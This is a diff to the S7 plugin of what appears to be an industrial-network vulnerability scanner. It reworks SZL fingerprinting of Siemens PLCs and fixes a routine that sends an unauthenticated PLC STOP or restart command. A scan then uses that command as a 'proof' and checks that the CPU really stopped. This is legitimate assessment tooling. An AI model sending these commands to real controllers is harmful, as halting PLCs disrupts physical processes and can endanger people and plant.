@@ -73,6 +73,16 @@ static psram_string make_finding_json(const char* id,
     return out;
 }
 
+static void append_json_object_field(psram_string& object, const char* key, const psram_string& value) {
+    if (object.empty() || object.back() != '}' || !key) return;
+    object.pop_back();
+    object += PSRAMUtils::createPSRAMString(",\"");
+    json_append_escaped(object, key);
+    object += PSRAMUtils::createPSRAMString("\":");
+    object += value;
+    object.push_back('}');
+}
+
 // Helper function to convert bytes to hex string
 static std::string bytesToHex(const std::vector<uint8_t>& data) {
     static const char kHex[] = "0123456789ABCDEF";
@@ -298,7 +308,8 @@ bool S7Plugin::isPacketWriter(const NetworkPacket& pkt) const {
     if ((rosctr == 0x01 || rosctr == 0x02 || rosctr == 0x03) && par_len >= 1) {
         const uint8_t func = params[0];
         // Write-related functions (minimal, conservative set).
-        if (func == 0x05 || func == 0x1B || func == 0x1D || func == 0x2D) return true;
+        if (func == 0x05 || func == 0x1B || func == 0x1D || func == 0x2D ||
+            func == S7::FUNC_STOP_CPU || func == S7::FUNC_HOT_RESTART) return true;
         return false;
     }
 
@@ -715,9 +726,9 @@ bool S7Plugin::activeScanJSON(const std::string& target,
 
     // Read SZL for device identification (best effort - don't fail if it doesn't work)
     if (setup_ok && !lightweight) {
-        szl_any = readSZL(sock, S7::SZL_MODULE_IDENTIFICATION, 0x0001, dev_info) || szl_any;
+        szl_any = readSZL(sock, S7::SZL_MODULE_IDENTIFICATION, 0x0000, dev_info) || szl_any;
         szl_any = readSZL(sock, S7::SZL_CPU_PROTECTION, 0x0004, dev_info) || szl_any;
-        szl_any = readSZL(sock, S7::SZL_COMPONENT_IDENTIFICATION, 0x0001, dev_info) || szl_any;
+        szl_any = readSZL(sock, S7::SZL_COMPONENT_IDENTIFICATION, 0x0000, dev_info) || szl_any;
         szl_any = readSZL(sock, S7::SZL_CPU_CHARACTERISTICS, 0x0001, dev_info) || szl_any;
     }
 
@@ -1408,51 +1419,68 @@ static bool s7_plc_control(int sock,
                            uint8_t func_code,
                            psram_string& out_err) {
     out_err.clear();
-    // Params: 00 01 12 04 11 41 01 00  (PLC control)
-    const uint8_t params[] = {0x00,0x01,0x12,0x04,0x11,0x41,0x01,0x00};
-    // Data: FF 09 00 08 + "P_PR" + "OG" + mode + func
-    // (mode is 0x00 for STOP, or 'H'/'C' for hot/cold start with func 0x28)
-    const uint8_t data[] = {
-        0xFF,0x09,0x00,0x08,
-        0x50,0x5F,0x50,0x52, // "P_PR"
-        0x4F,0x47,           // "OG"
-        0x00,                // mode placeholder
-        0x00                 // func placeholder
-    };
-    uint8_t d[sizeof(data)];
-    memcpy(d, data, sizeof(d));
-    d[10] = mode_ch;
-    d[11] = func_code;
-
-    std::vector<uint8_t> rx;
-    if (!s7_userdata_exchange(sock, pdu_ref, params, sizeof(params), d, sizeof(d),
-                              rx, /*rx_cap*/1024, out_err)) {
+    // Snap7 opPlcStop() uses a normal S7 JOB (not a Userdata telegram):
+    // [0x29, five zero bytes, 0x09, "P_PROGRAM"].
+    const bool stop = (func_code == S7::FUNC_STOP_CPU);
+    const size_t param_len = stop ? 16U : 20U;
+    const size_t total_len = 7U + 10U + param_len;
+    std::vector<uint8_t> pkt(total_len, 0);
+    pkt[0] = 0x03; pkt[1] = 0x00; wr16be_free(pkt.data() + 2, (uint16_t)total_len);
+    pkt[4] = 0x02; pkt[5] = 0xF0; pkt[6] = 0x80;
+    pkt[7] = 0x32; pkt[8] = S7::PDU_TYPE_JOB;
+    wr16be_free(pkt.data() + 9, 0x0000);
+    wr16be_free(pkt.data() + 11, pdu_ref);
+    wr16be_free(pkt.data() + 13, (uint16_t)param_len);
+    wr16be_free(pkt.data() + 15, 0x0000);
+    uint8_t* params = pkt.data() + 17;
+    params[0] = func_code;
+    if (!stop) {
+        // Hot/cold start structure has seven reserved bytes and Len_1.
+        params[8] = 0x00; params[9] = 0x00; params[10] = 0x09;
+        memcpy(params + 11, "P_PROGRAM", 9);
+    } else {
+        params[6] = 0x09;
+        memcpy(params + 7, "P_PROGRAM", 9);
+    }
+    (void)mode_ch; // The standard STOP request has no mode byte.
+    if (::send(sock, pkt.data(), pkt.size(), 0) != (ssize_t)pkt.size()) {
+        out_err = PSRAMUtils::createPSRAMString("{\"status\":\"send_failed\",\"command_sent\":false}");
         return false;
     }
 
+    uint8_t rx[1024]; size_t rx_len = 0;
+    if (!recv_tpkt_frame_free(sock, rx, sizeof(rx), rx_len)) {
+        out_err = PSRAMUtils::createPSRAMString("{\"status\":\"no_response\",\"command_sent\":true}");
+        return false;
+    }
     size_t s7_len = 0;
-    const uint8_t* s7 = locate_s7_pdu_free(rx.data(), rx.size(), s7_len);
-    if (!s7 || s7_len < 12) {
-        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"no_s7_pdu\"}");
-        return false;
-    }
-    if (s7[1] != S7::PDU_TYPE_USERDATA) {
-        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"unexpected_rosctr\"}");
+    const uint8_t* s7 = locate_s7_pdu_free(rx, rx_len, s7_len);
+    if (!s7 || s7_len < 12 || s7[1] != S7::PDU_TYPE_ACK_DATA) {
+        out_err = PSRAMUtils::createPSRAMString("{\"status\":\"invalid_response\",\"command_sent\":true}");
         return false;
     }
     const uint16_t par_len = rd16be_free(s7 + 6);
     const uint16_t dat_len = rd16be_free(s7 + 8);
-    if ((size_t)10 + (size_t)par_len + (size_t)dat_len > s7_len || dat_len < 1) {
-        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"invalid_lengths\"}");
+    if ((size_t)12 + (size_t)par_len + (size_t)dat_len > s7_len) {
+        out_err = PSRAMUtils::createPSRAMString("{\"status\":\"invalid_lengths\",\"command_sent\":true}");
         return false;
     }
-    const uint8_t* dd = s7 + 10 + par_len;
-    if (dd[0] != 0xFF) {
-        char e[96]; snprintf(e, sizeof(e), "{\"error\":\"plc_control_failed\",\"return_code\":%u}", (unsigned)dd[0]);
-        out_err = PSRAMUtils::createPSRAMString(e);
-        return false;
-    }
-    return true;
+    const uint8_t err_class = s7[10];
+    const uint8_t err_code = s7[11];
+    const uint8_t* response_params = s7 + 12;
+    const uint8_t response_fun = par_len > 0 ? response_params[0] : 0;
+    const uint8_t response_para = par_len > 1 ? response_params[1] : 0;
+    const bool accepted = (err_class == 0 && err_code == 0);
+    const bool already_stopped = (!accepted && response_fun == S7::FUNC_STOP_CPU && response_para == 0x07);
+    char status[32];
+    snprintf(status, sizeof(status), "%s", accepted ? "accepted" : (already_stopped ? "already_stopped" : "rejected"));
+    char e[256];
+    snprintf(e, sizeof(e),
+             "{\"status\":\"%s\",\"command_sent\":true,\"response_accepted\":%s,\"plc_state_verified\":false,\"s7_error_class\":%u,\"s7_error_code\":%u,\"response_function\":%u,\"response_parameter\":%u}",
+             status, accepted ? "true" : "false", (unsigned)err_class, (unsigned)err_code,
+             (unsigned)response_fun, (unsigned)response_para);
+    out_err = PSRAMUtils::createPSRAMString(e);
+    return accepted || already_stopped;
 }
 
 bool S7Plugin::clientOpsPSRAM(const psram_string& request_json, psram_string& out_json) {
@@ -1623,8 +1651,8 @@ bool S7Plugin::clientOpsPSRAM(const psram_string& request_json, psram_string& ou
         }
         if (auto v = cJSON_GetObjectItem(root, "include_block_dir"); v && cJSON_IsBool(v)) include_dir = cJSON_IsTrue(v);
 
-        (void)readSZL(sock, S7::SZL_MODULE_IDENTIFICATION, 0x0001, dev_info);
-        (void)readSZL(sock, S7::SZL_COMPONENT_IDENTIFICATION, 0x0001, dev_info);
+        (void)readSZL(sock, S7::SZL_MODULE_IDENTIFICATION, 0x0000, dev_info);
+        (void)readSZL(sock, S7::SZL_COMPONENT_IDENTIFICATION, 0x0000, dev_info);
         (void)readSZL(sock, S7::SZL_CPU_PROTECTION, 0x0004, dev_info);
         (void)readSZL(sock, S7::SZL_CPU_CHARACTERISTICS, 0x0001, dev_info);
 
@@ -1840,8 +1868,8 @@ bool S7Plugin::clientOpsPSRAM(const psram_string& request_json, psram_string& ou
             rep += PSRAMUtils::createPSRAMString("]}");
         }
     } else if (strcmp(op, "get_info") == 0) {
-        (void)readSZL(sock, S7::SZL_MODULE_IDENTIFICATION, 0x0001, dev_info);
-        (void)readSZL(sock, S7::SZL_COMPONENT_IDENTIFICATION, 0x0001, dev_info);
+        (void)readSZL(sock, S7::SZL_MODULE_IDENTIFICATION, 0x0000, dev_info);
+        (void)readSZL(sock, S7::SZL_COMPONENT_IDENTIFICATION, 0x0000, dev_info);
         (void)readSZL(sock, S7::SZL_CPU_PROTECTION, 0x0004, dev_info);
         (void)readSZL(sock, S7::SZL_CPU_CHARACTERISTICS, 0x0001, dev_info);
 
@@ -2140,8 +2168,8 @@ bool S7Plugin::doVulnerabilityScanPSRAM(const psram_string& target,
         const bool want_fp = wants("fingerprint_szl") || wants("unauthenticated_info");
         const bool want_prot = wants("protection_level") || wants("unauthenticated_info") || wants("stop_capability_assessment");
         if (want_fp) {
-            (void)readSZL(sock, S7::SZL_MODULE_IDENTIFICATION, 0x0001, dev_info);
-            (void)readSZL(sock, S7::SZL_COMPONENT_IDENTIFICATION, 0x0001, dev_info);
+            (void)readSZL(sock, S7::SZL_MODULE_IDENTIFICATION, 0x0000, dev_info);
+            (void)readSZL(sock, S7::SZL_COMPONENT_IDENTIFICATION, 0x0000, dev_info);
         }
         if (want_prot) {
             (void)readSZL(sock, S7::SZL_CPU_PROTECTION, 0x0004, dev_info);
@@ -2345,13 +2373,37 @@ bool S7Plugin::doVulnerabilityScanPSRAM(const psram_string& target,
             } else {
                 psram_string e;
                 bool okp = s7_plc_control(sock, /*pdu_ref*/0x0600, /*mode*/0x00, /*func*/0x29, e);
-                findings.push_back(make_finding_json(
+                bool verified_stop = false;
+                const char* verification = "not_attempted";
+                if (okp) {
+                    S7DeviceInfo status_info;
+                    if (readSZL(sock, S7::SZL_PLC_STATUS, 0x0000, status_info)) {
+                        verified_stop = (status_info.plc_status == S7::CPU_STATUS_STOP);
+                        verification = verified_stop ? "stop" :
+                            (status_info.plc_status == S7::CPU_STATUS_RUN ? "run" : "unknown");
+                    } else {
+                        verification = "unavailable";
+                    }
+                }
+                const bool already_stopped = e.find("already_stopped") != psram_string::npos;
+                const char* finding_status = !okp ? "rejected" :
+                    (verified_stop ? "verified" : (already_stopped ? "already_stopped" : "accepted_unverified"));
+                psram_string finding = make_finding_json(
                     okp ? "s7_proof_plc_stop_sent" : "s7_proof_plc_stop_failed",
-                    "PLC STOP proof (sent)",
+                    verified_stop ? "PLC STOP proof (verified)" :
+                        (already_stopped ? "PLC STOP proof (already stopped)" : "PLC STOP proof (response received)"),
                     okp ? "CRITICAL" : "HIGH",
-                    okp ? "STOP command sent (device response indicates success)." : "STOP command sent but failed / rejected.",
-                    "Do not run on production systems."
-                ));
+                    verified_stop ? "The standard P_PROGRAM STOP job was accepted and the subsequent PLC status query reported STOP."
+                        : (okp ? "The standard P_PROGRAM STOP job was accepted, but the PLC state could not be verified as STOP."
+                              : "The standard P_PROGRAM STOP job was sent and the PLC rejected it or did not return a valid response."),
+                    "Do not run on production systems.", finding_status);
+                append_json_object_field(finding, "control", e);
+                psram_string verify_json = PSRAMUtils::createPSRAMString("{\"state\":\"");
+                verify_json += PSRAMUtils::createPSRAMString(verification);
+                verify_json += PSRAMUtils::createPSRAMString("\",\"verified\":");
+                verify_json += PSRAMUtils::createPSRAMString(verified_stop ? "true}" : "false}");
+                append_json_object_field(finding, "plc_state", verify_json);
+                findings.push_back(finding);
                 bump(okp ? "CRITICAL" : "HIGH");
             }
         }
@@ -2416,14 +2468,20 @@ bool S7Plugin::doVulnerabilityScanPSRAM(const psram_string& target,
         rep += PSRAMUtils::createPSRAMString(",\"product\":\"");
         json_append_escaped(rep, dev_info.order_code);
         rep += PSRAMUtils::createPSRAMString("\"");
-    } else if (dev_info.module_type[0] != '\0') {
-        rep += PSRAMUtils::createPSRAMString(",\"product\":\"");
-        json_append_escaped(rep, dev_info.module_type);
-        rep += PSRAMUtils::createPSRAMString("\"");
     }
     if (dev_info.firmware_version[0] != '\0') {
         rep += PSRAMUtils::createPSRAMString(",\"firmware\":\"");
         json_append_escaped(rep, dev_info.firmware_version);
+        rep += PSRAMUtils::createPSRAMString("\"");
+    }
+    if (dev_info.module_type[0] != '\0') {
+        rep += PSRAMUtils::createPSRAMString(",\"module_type\":\"");
+        json_append_escaped(rep, dev_info.module_type);
+        rep += PSRAMUtils::createPSRAMString("\"");
+    }
+    if (dev_info.serial_number[0] != '\0') {
+        rep += PSRAMUtils::createPSRAMString(",\"serial\":\"");
+        json_append_escaped(rep, dev_info.serial_number);
         rep += PSRAMUtils::createPSRAMString("\"");
     }
     rep += PSRAMUtils::createPSRAMString("},");
@@ -2546,9 +2604,9 @@ std::string S7Plugin::legacyDoVulnerabilityScan(const std::string& target) {
     }
 
     // Read device information
-    readSZL(sock, S7::SZL_MODULE_IDENTIFICATION, 0x0001, dev_info);
+    readSZL(sock, S7::SZL_MODULE_IDENTIFICATION, 0x0000, dev_info);
     readSZL(sock, S7::SZL_CPU_PROTECTION, 0x0004, dev_info);
-    readSZL(sock, S7::SZL_COMPONENT_IDENTIFICATION, 0x0001, dev_info);
+    readSZL(sock, S7::SZL_COMPONENT_IDENTIFICATION, 0x0000, dev_info);
 
     // ==================== VULNERABILITY CHECKS (Fase 2) ====================
 
@@ -3691,7 +3749,7 @@ bool S7Plugin::checkAuthentication(int sock, psram_string& finding) {
 
     // Test 2: Try to read module identification (should always work, but check if restricted)
     S7DeviceInfo module_info;
-    bool can_read_module = readSZL(sock, S7::SZL_MODULE_IDENTIFICATION, 0x0001, module_info);
+    bool can_read_module = readSZL(sock, S7::SZL_MODULE_IDENTIFICATION, 0x0000, module_info);
 
     if (!can_read_module) {
         // Good - SZL reads are restricted
@@ -3816,201 +3874,183 @@ bool S7Plugin::sendS7SetupComm(int sock, S7DeviceInfo& dev_info) {
     return true;
 }
 
+static bool looksLikeOrderCode(const char* value) {
+    return value && (strncmp(value, "6ES7", 4) == 0 || strncmp(value, "6ES", 3) == 0);
+}
+
+static bool copySZLField(const uint8_t* records, size_t records_len,
+                         size_t offset, size_t width, char* out, size_t out_size,
+                         bool reject_order_code = false) {
+    if (!records || !out || out_size < 2 || offset > records_len || width > records_len - offset) {
+        return false;
+    }
+    const size_t limit = (width < out_size - 1U) ? width : out_size - 1U;
+    size_t n = 0;
+    for (; n < limit; ++n) {
+        const uint8_t c = records[offset + n];
+        if (c == 0x00) break;
+        if (c < 0x20 || c > 0x7E) return false;
+        out[n] = (char)c;
+    }
+    while (n > 0 && (out[n - 1] == ' ' || out[n - 1] == '\t')) --n;
+    out[n] = '\0';
+    if (n == 0) return false;
+    if (reject_order_code && looksLikeOrderCode(out)) {
+        out[0] = '\0';
+        return false;
+    }
+    return true;
+}
+
+static bool applySZLRecords(const uint8_t* records, size_t records_len,
+                            uint16_t szl_id, S7DeviceInfo& dev_info) {
+    if (!records || records_len < 4) return false;
+    switch (szl_id) {
+        case S7::SZL_MODULE_IDENTIFICATION: {
+            // Snap7/Moka7 expose the order code at record offset 2 (20 bytes);
+            // the final three bytes are the firmware version tuple.
+            copySZLField(records, records_len, 2, 20, dev_info.order_code,
+                         sizeof(dev_info.order_code));
+            if (records_len >= 3 && records[records_len - 3] <= 99 &&
+                records[records_len - 2] <= 99 && records[records_len - 1] <= 99) {
+                snprintf(dev_info.firmware_version, sizeof(dev_info.firmware_version),
+                         "V%u.%u.%u", records[records_len - 3],
+                         records[records_len - 2], records[records_len - 1]);
+            }
+            return true;
+        }
+        case S7::SZL_COMPONENT_IDENTIFICATION: {
+            // TS7CpuInfo/S7CpuInfo fixed layout (record-only buffer).
+            copySZLField(records, records_len, 172, 32, dev_info.module_type,
+                         sizeof(dev_info.module_type));
+            copySZLField(records, records_len, 138, 24, dev_info.serial_number,
+                         sizeof(dev_info.serial_number), true);
+            copySZLField(records, records_len, 2, 24, dev_info.plant_id,
+                         sizeof(dev_info.plant_id));
+            copySZLField(records, records_len, 104, 26, dev_info.copyright_info,
+                         sizeof(dev_info.copyright_info));
+            copySZLField(records, records_len, 36, 24, dev_info.module_name,
+                         sizeof(dev_info.module_name));
+            return true;
+        }
+        case S7::SZL_CPU_PROTECTION:
+            // S7Protection.Update() reads the first record's level at offset 2.
+            if (records_len >= 4) {
+                dev_info.protection_level = records[2] & 0x0F;
+                LOG_INFOF(TAG_S7, "Protection level: %u", dev_info.protection_level);
+                return true;
+            }
+            return false;
+        case S7::SZL_PLC_STATUS:
+            // Snap7 opGetPlcStatus() reads opData[7]; with the record-only
+            // buffer this is byte 3 of the first status record.
+            if (records_len >= 4) {
+                dev_info.plc_status = records[3];
+                return true;
+            }
+            return false;
+        default:
+            return true;
+    }
+}
+
+static bool decodeSZLFrame(const uint8_t* s7, size_t s7_len, bool first,
+                           std::vector<uint8_t>& records, bool& done, uint8_t& seq_in) {
+    if (!s7 || s7_len < 12 || s7[0] != 0x32 || s7[1] != S7::PDU_TYPE_USERDATA) return false;
+    const uint16_t param_len = rd16be_free(s7 + 6);
+    const uint16_t data_len = rd16be_free(s7 + 8);
+    if (param_len < 8 || (size_t)10 + param_len + data_len > s7_len) return false;
+    const uint8_t* params = s7 + 10;
+    const uint8_t* data = params + param_len;
+    if (data_len < 4 || data[0] != 0xFF) return false;
+    const uint16_t dlen = rd16be_free(data + 2);
+    // The first response carries the four-byte SZL header after the
+    // Ret/Transport/DLen/ID/Index prefix (data + 12).  Continuation
+    // responses omit ID/Index but still retain Ret/Transport/DLen, so the
+    // record slice starts at data + 8 (as in Snap7/Moka7 PDataNext).
+    size_t source_offset = first ? 12U : 8U;
+    size_t payload_len = dlen;
+    if (first) {
+        if (dlen < 8 || data_len < 12) return false;
+        const uint16_t record_len = rd16be_free(data + 8);
+        const uint16_t record_count = rd16be_free(data + 10);
+        const size_t records_total = (size_t)record_len * (size_t)record_count;
+        if (records_total == 0 || records_total > (size_t)dlen - 8U) return false;
+        payload_len = records_total;
+    } else if (payload_len > (size_t)dlen || payload_len > (size_t)data_len - source_offset) {
+        return false;
+    }
+    if (source_offset > data_len || payload_len > (size_t)data_len - source_offset ||
+        payload_len > 4096U || records.size() > 4096U - payload_len) return false;
+    records.insert(records.end(), data + source_offset, data + source_offset + payload_len);
+    seq_in = params[7];
+    // ResParams.resvd is followed by the error word.  The low byte of the
+    // reserved field (PDU byte 26, params[9]) is the continuation marker.
+    done = (param_len < 10) || (params[9] == 0x00);
+    return true;
+}
+
 bool S7Plugin::readSZL(int sock, uint16_t szl_id, uint16_t szl_index, S7DeviceInfo& dev_info) {
-    // Build SZL Read request (Userdata)
-    // This is a simplified implementation - full SZL requires complex parameter encoding
-    uint8_t szl_req[] = {
-        // TPKT Header
-        0x03, 0x00, 0x00, 0x21,  // Length = 33 bytes
-        // COTP Header
-        0x02, 0xF0, 0x80,
-        // S7 Header
-        0x32,                    // Protocol ID
-        S7::PDU_TYPE_USERDATA,   // ROSCTR = Userdata
-        0x00, 0x00,              // Redundancy ID
-        0x00, 0x02,              // PDU Reference
-        0x00, 0x0C,              // Parameter length = 12
-        0x00, 0x04,              // Data length = 4
-        // Parameters (Userdata)
-        0x00, 0x01, 0x12,        // Parameter head (Request, Type: Request)
-        0x04,                    // Parameter length following
-        0x11,                    // SZL functions
-        0x44,                    // Request SZL (0x04 = read, 0x44 with data)
-        0x01,                    // Sequence number
-        0x00,                    // Reserved
-        // Data
-        0x00,                    // Return code
-        0xFF,                    // Transport size (NULL)
-        0x09, 0x00,              // Length in bytes
-        0x00, 0x00,              // SZL-ID (will be filled)
-        0x00, 0x00               // SZL-Index (will be filled)
+    // Snap7/Moka7-compatible first SZL telegram: 8-byte parameters + 8-byte data.
+    uint8_t first[] = {
+        0x03,0x00,0x00,0x21, 0x02,0xF0,0x80,
+        0x32,S7::PDU_TYPE_USERDATA,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x08,
+        0x00,0x01,0x12,0x04,0x11,0x44,0x01,0x00,
+        0xFF,0x09,0x00,0x04,0x00,0x00,0x00,0x00
     };
-
-    // Fill SZL ID and Index
-    wr16be(szl_req + 29, szl_id);
-    wr16be(szl_req + 31, szl_index);
-
-    if (::send(sock, szl_req, sizeof(szl_req), 0) != sizeof(szl_req)) {
+    wr16be(first + 29, szl_id);
+    wr16be(first + 31, szl_index);
+    if (::send(sock, first, sizeof(first), 0) != (ssize_t)sizeof(first)) {
         LOG_WARNINGF(TAG_S7, "SZL read send failed (ID=0x%04X)", szl_id);
         return false;
     }
 
-    // Receive response (SZL data can be large)
-    uint8_t rx[1024];
-    ssize_t n = ::recv(sock, rx, sizeof(rx), 0);
-    if (n < 30) {
-        LOG_WARNINGF(TAG_S7, "SZL response too short (ID=0x%04X)", szl_id);
+    std::vector<uint8_t> records;
+    records.reserve(512);
+    bool first_frame = true;
+    bool done = false;
+    uint8_t seq_in = 0;
+    uint16_t pdu_seq = 2;
+    for (unsigned fragment = 0; fragment < 16 && !done; ++fragment) {
+        uint8_t rx[4096];
+        size_t rx_len = 0;
+        if (!recv_tpkt_frame_free(sock, rx, sizeof(rx), rx_len)) return false;
+        size_t s7_len = 0;
+        const uint8_t* s7 = locate_s7_pdu_free(rx, rx_len, s7_len);
+        if (!decodeSZLFrame(s7, s7_len, first_frame, records, done, seq_in)) return false;
+        first_frame = false;
+        if (done) break;
+        uint8_t next[] = {
+            0x03,0x00,0x00,0x21, 0x02,0xF0,0x80,
+            0x32,S7::PDU_TYPE_USERDATA,0x00,0x00,0x00,0x06,0x00,0x0C,0x00,0x04,
+            0x00,0x01,0x12,0x08,0x12,0x44,0x01,0x01,0x00,0x00,0x00,0x00,
+            0x0A,0x00,0x00,0x00
+        };
+        wr16be(next + 11, ++pdu_seq);
+        next[24] = seq_in;
+        if (::send(sock, next, sizeof(next), 0) != (ssize_t)sizeof(next)) return false;
+    }
+    if (first_frame || !done || !applySZLRecords(records.data(), records.size(), szl_id, dev_info)) {
+        LOG_WARNINGF(TAG_S7, "Invalid or incomplete SZL response (ID=0x%04X)", szl_id);
         return false;
     }
-
-    // Locate S7 PDU
-    size_t s7_len = 0;
-    const uint8_t* s7 = locateS7Pdu(rx, (size_t)n, s7_len);
-    if (!s7 || s7[1] != S7::PDU_TYPE_USERDATA) {
-        LOG_WARNINGF(TAG_S7, "Invalid SZL response (ID=0x%04X)", szl_id);
-        return false;
-    }
-
-    // Parse SZL data
-    bool parsed = parseSZLResponse(s7, s7_len, szl_id, dev_info);
-    if (parsed) {
-        dev_info.szl_read_success = true;
-        LOG_INFOF(TAG_S7, "SZL 0x%04X read successfully", szl_id);
-    }
-
-    return parsed;
+    dev_info.szl_read_success = true;
+    LOG_INFOF(TAG_S7, "SZL 0x%04X read successfully", szl_id);
+    return true;
 }
 
 bool S7Plugin::parseSZLResponse(const uint8_t* data, size_t len, uint16_t szl_id, S7DeviceInfo& dev_info) {
-    // Simplified SZL parsing - real implementation needs to handle variable length records
-    // SZL structure after S7 header (offset 12+):
-    // Parameter: [00 01 12] [length] [11 44] [seq] [00] [last_unit] [error_code]
-    // Data: [return_code] [transport_size] [length] [SZL_ID] [SZL_Index] [SZL_length] [SZL_count] [records...]
-
-    if (len < 40) return false;  // Minimum size for meaningful SZL response
-
-    // Find data section (after parameters)
-    uint16_t param_len = rd16be(data + 6);
-    uint16_t data_len = rd16be(data + 8);
-
-    if (10 + param_len + data_len > len) {
-        LOG_WARNING(TAG_S7, "SZL response length mismatch");
-        return false;
+    size_t s7_len = 0;
+    const uint8_t* s7 = locate_s7_pdu_free(data, len, s7_len);
+    if (!s7) {
+        s7 = data;
+        s7_len = len;
     }
-
-    const uint8_t* szl_data = data + 10 + param_len;
-
-    // Check return code (offset 0 in data section)
-    if (szl_data[0] != 0xFF) {  // 0xFF = success
-        LOG_WARNINGF(TAG_S7, "SZL read error code: 0x%02X", szl_data[0]);
-        return false;
-    }
-
-    // Best-effort parse SZL header:
-    // [0]=return_code [1]=transport_size [2..3]=length [4..5]=SZL_ID [6..7]=SZL_Index
-    // [8..9]=SZL_len [10..11]=SZL_count [12..]=records...
-    if (data_len < 12) return false;
-    const uint16_t resp_id = rd16be(szl_data + 4);
-    (void)resp_id;
-    const uint16_t szl_len = rd16be(szl_data + 8);
-    const uint16_t szl_cnt = rd16be(szl_data + 10);
-    const uint8_t* records = szl_data + 12;
-    const size_t records_total = (size_t)szl_len * (size_t)szl_cnt;
-    if (records_total == 0 || 12U + records_total > (size_t)data_len) {
-        // Some devices respond with unexpected lengths; continue with conservative fallback.
-    }
-
-    auto extract_ascii_tokens = [&](const uint8_t* buf, size_t blen, char* out1, size_t out1sz, char* out2, size_t out2sz) {
-        if (out1 && out1sz) out1[0] = '\0';
-        if (out2 && out2sz) out2[0] = '\0';
-        if (!buf || blen == 0) return;
-        // Find up to 2 printable ASCII runs (len>=4).
-        size_t found = 0;
-        size_t i = 0;
-        while (i < blen && found < 2) {
-            while (i < blen) {
-                uint8_t c = buf[i];
-                if (c >= 32 && c <= 126) break;
-                ++i;
-            }
-            size_t j = i;
-            while (j < blen) {
-                uint8_t c = buf[j];
-                if (!(c >= 32 && c <= 126)) break;
-                ++j;
-            }
-            size_t run = (j > i) ? (j - i) : 0;
-            if (run >= 4) {
-                if (found == 0 && out1 && out1sz) {
-                    size_t n = (run < (out1sz - 1)) ? run : (out1sz - 1);
-                    memcpy(out1, buf + i, n);
-                    out1[n] = '\0';
-                } else if (found == 1 && out2 && out2sz) {
-                    size_t n = (run < (out2sz - 1)) ? run : (out2sz - 1);
-                    memcpy(out2, buf + i, n);
-                    out2[n] = '\0';
-                }
-                found++;
-            }
-            i = (j > i) ? j : (i + 1);
-        }
-    };
-
-    // Parse based on SZL ID
-    switch (szl_id) {
-        case S7::SZL_MODULE_IDENTIFICATION: {
-            // SZL 0x0011: Module Identification
-            // Contains: Module name, Order code, Version, etc.
-            // Best-effort: extract printable tokens from first record.
-            if (szl_len > 0 && data_len >= 12 + szl_len) {
-                const uint8_t* rec0 = records;
-                char t1[40], t2[40];
-                extract_ascii_tokens(rec0, szl_len, t1, sizeof(t1), t2, sizeof(t2));
-                if (dev_info.module_type[0] == '\0' && t1[0] != '\0') {
-                    strncpy(dev_info.module_type, t1, sizeof(dev_info.module_type) - 1);
-                    dev_info.module_type[sizeof(dev_info.module_type) - 1] = '\0';
-                }
-                if (dev_info.order_code[0] == '\0' && t2[0] != '\0') {
-                    strncpy(dev_info.order_code, t2, sizeof(dev_info.order_code) - 1);
-                    dev_info.order_code[sizeof(dev_info.order_code) - 1] = '\0';
-                }
-            }
-            break;
-        }
-
-        case S7::SZL_CPU_PROTECTION: {
-            // SZL 0x0232 Index 4: CPU Protection level
-            if (data_len < 20) break;
-            const uint8_t* record = szl_data + 8;
-            dev_info.protection_level = record[2] & 0x0F;  // Lower nibble = protection level
-            LOG_INFOF(TAG_S7, "Protection level: %u", dev_info.protection_level);
-            break;
-        }
-
-        case S7::SZL_COMPONENT_IDENTIFICATION: {
-            // SZL 0x001C: Component identification (serial, plant ID, etc.)
-            if (szl_len > 0 && data_len >= 12 + szl_len) {
-                const uint8_t* rec0 = records;
-                char t1[40], t2[40];
-                extract_ascii_tokens(rec0, szl_len, t1, sizeof(t1), t2, sizeof(t2));
-                if (dev_info.serial_number[0] == '\0' && t1[0] != '\0') {
-                    strncpy(dev_info.serial_number, t1, sizeof(dev_info.serial_number) - 1);
-                    dev_info.serial_number[sizeof(dev_info.serial_number) - 1] = '\0';
-                }
-                if (dev_info.plant_id[0] == '\0' && t2[0] != '\0') {
-                    strncpy(dev_info.plant_id, t2, sizeof(dev_info.plant_id) - 1);
-                    dev_info.plant_id[sizeof(dev_info.plant_id) - 1] = '\0';
-                }
-            }
-            break;
-        }
-
-        default:
-            LOG_INFOF(TAG_S7, "SZL 0x%04X parsed (generic)", szl_id);
-            break;
-    }
-
-    return true;
+    std::vector<uint8_t> records;
+    bool done = false;
+    uint8_t seq = 0;
+    if (!decodeSZLFrame(s7, s7_len, true, records, done, seq) || !done) return false;
+    return applySZLRecords(records.data(), records.size(), szl_id, dev_info);
 }
 
 bool S7Plugin::buildDeviceInfoJSON(const S7DeviceInfo& dev_info,
@@ -4051,7 +4091,19 @@ bool S7Plugin::buildDeviceInfoJSON(const S7DeviceInfo& dev_info,
 
     if (dev_info.serial_number[0] != '\0') {
         out_json += PSRAMUtils::createPSRAMString("\"serial\":\"");
-        out_json += PSRAMUtils::createPSRAMString(dev_info.serial_number);
+        json_append_escaped(out_json, dev_info.serial_number);
+        out_json += PSRAMUtils::createPSRAMString("\",");
+    }
+
+    if (dev_info.module_name[0] != '\0') {
+        out_json += PSRAMUtils::createPSRAMString("\"module_name\":\"");
+        json_append_escaped(out_json, dev_info.module_name);
+        out_json += PSRAMUtils::createPSRAMString("\",");
+    }
+
+    if (dev_info.plant_id[0] != '\0') {
+        out_json += PSRAMUtils::createPSRAMString("\"as_name\":\"");
+        json_append_escaped(out_json, dev_info.plant_id);
         out_json += PSRAMUtils::createPSRAMString("\",");
     }
 
